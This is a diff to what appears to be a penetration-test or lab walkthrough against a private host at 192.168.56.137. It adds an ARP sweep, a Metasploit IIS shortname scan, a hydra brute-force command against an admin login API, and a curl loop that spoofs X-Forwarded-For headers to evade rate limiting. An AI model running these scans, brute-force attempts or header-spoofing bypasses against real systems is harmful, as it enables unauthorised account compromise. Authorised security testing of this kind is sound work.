@@ -14,6 +14,9 @@ First, verify the target via ARP and execute a full port scan to identify expose
 # Host discovery via ARP (bypassing ICMP blocks)
 nmap -sn 192.168.56.137 -PR
 
+# Host discovery via local network ARP sweep (alternative)
+arp-scan -I eth1 --localnet
+
 # Full TCP port scan with Version Detection
 nmap -sS -sV -p- -T4 192.168.56.137 -v
 ```
@@ -29,6 +32,9 @@ nikto -h https://192.168.56.137 -ssl
 
 # Enumerate hidden directories / backend endpoints
 ffuf -u https://192.168.56.137/backend/api/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,401,403,500 -p 1.0 -k -s
+
+# Vulnerability Scanning via Metasploit (IIS Shortname)
+msfconsole -q -x "use auxiliary/scanner/http/iis_shortname_scanner; set RHOSTS 192.168.56.137; set RPORT 443; set SSL true; run; exit"
 ```
 
 ---
@@ -47,6 +53,18 @@ curl -k -X POST https://192.168.56.137/backend/api/auth/login \
 for i in {1..7}; do 
   curl -s -k -X POST https://192.168.56.137/backend/api/auth/login \
        -H "Content-Type: application/json" \
+       -d '{"username":"admin","password":"wrongpassword"}'
+  echo ''
+done
+
+# Demonstrate Rate Limiting False Positives with Automated Tools
+hydra -l admin -p Password1! 192.168.56.137 -s 443 https-post-form "/backend/api/auth/login:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:H=Content-Type\: application/json:F=AUTH_FAILED"
+
+# Bypass Rate Limiting by spoofing source IP
+for i in {1..7}; do 
+  curl -s -k -X POST https://192.168.56.137/backend/api/auth/login \
+       -H "Content-Type: application/json" \
+       -H "X-Forwarded-For: 1.2.3.$i" \
        -d '{"username":"admin","password":"wrongpassword"}'
   echo ''
 done
